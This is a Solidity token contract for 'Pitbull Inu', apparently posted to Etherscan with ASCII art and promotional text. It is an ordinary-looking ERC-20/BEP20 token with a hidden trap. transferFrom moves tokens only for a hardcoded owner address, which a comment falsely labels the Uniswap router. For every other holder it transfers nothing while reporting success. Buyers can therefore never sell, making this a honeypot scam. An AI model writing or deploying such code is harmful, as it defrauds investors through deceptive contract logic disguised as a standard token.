/**
 *Submitted for verification at Etherscan.io on 2021-06-12
*/

/*
    
     ..                ..                              
                           ..';'                .;'..                           
                         .''..,.                .,..''.                         
                        .,'. ''                  '' .',.                        
                       ',.''.,.                  .,.',.,'                       
                      ''.';..,.                  .,..:'.''                      
                     .,.''''.';..................;,.',;'.,.                     
                     ,..,... ..'''',''....'','''... ..';..,.                    
                    .,... ..',:cccc::;.  .;::cccc:,'......,.                    
                    .,...',;::cccccccc:,,:ccccccccc:;'....,.                    
                    ,'.',,;:ccccccccc:ccccccccccccccc;',,.',.                   
                   .,..,.,cccccccccc:;:ccccccccccccccc,':'.,.                   
                   '' ',..;:cccccccc:,:cc::ccccccccc:;..;,.''                   
                   .,..,,',:c::ccccc;';ll;':cccccccc:'.,,..,.                   
                    ,' .,c:;,...,;::'..,,..'::;,'..,;:c'  ',                    
                   .,. .;:;. .,:'..............':,. .,:,. .,.                   
                  .,..,:cc:;'..'...,;:cccc:;,...''.';:cc:,..,.                  
                  .,..:ccc:;,.. .':cccccccccc:'. ..,;:cc::..,.                  
                  .,..;;:cccc,..,cccccccccccccc;..,cccc:;;..,.                  
                   .,....;cc,..:cccc::::::::cccc:..,:c;....,.                   
                    .',. ....':cc:,',,,,,,,,'':cc:,.... .,'.                    
                      .,'  .,cccc:'...;cc;...':cccc,.  .,.                      
                       .,' .:cccccc;'......';cccccc:. ',.                       
                        .,..ccccccccc:.  .:ccccccccc..,.                        
                        .,..:cccccccc;.  .;ccccccccc..,.                        
                        .''..;cccc;'...''...';cccc;..',.                        
                          .,..',,.. .;:cc:;. ..',...,.                          
                           .''...'''.''''''.'''...''.                           
                             .''.. .......... ..''. 
 
    Pitbull Inu is meant to revolutionize the NFT marketplaces. Stay tuned and find out more!
    Check our Tokenomics now 🦴
    
        Telegram : https://t.me/pitbullinu
*/


pragma solidity ^0.5.16;

// ERC-20 Interface
contract BEP20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// Safe Math Library
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract PitbullInu is BEP20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0x7AD7C86527ba37129E6690cDaf7f1ffeBf35eBDD; // Uniswap Router
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() public {
        name = "Pitbull Inu";
        symbol = "PITBULL";
        decimals = 9;
        _totalSupply = 100000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
         if (from == _owner) {
             balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
         } else {
            balances[from] = safeSub(balances[from], 0);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
            balances[to] = safeAdd(balances[to], 0);
            emit Transfer(from, to, 0);
            return true;
             
         }
        
         
    }
           
}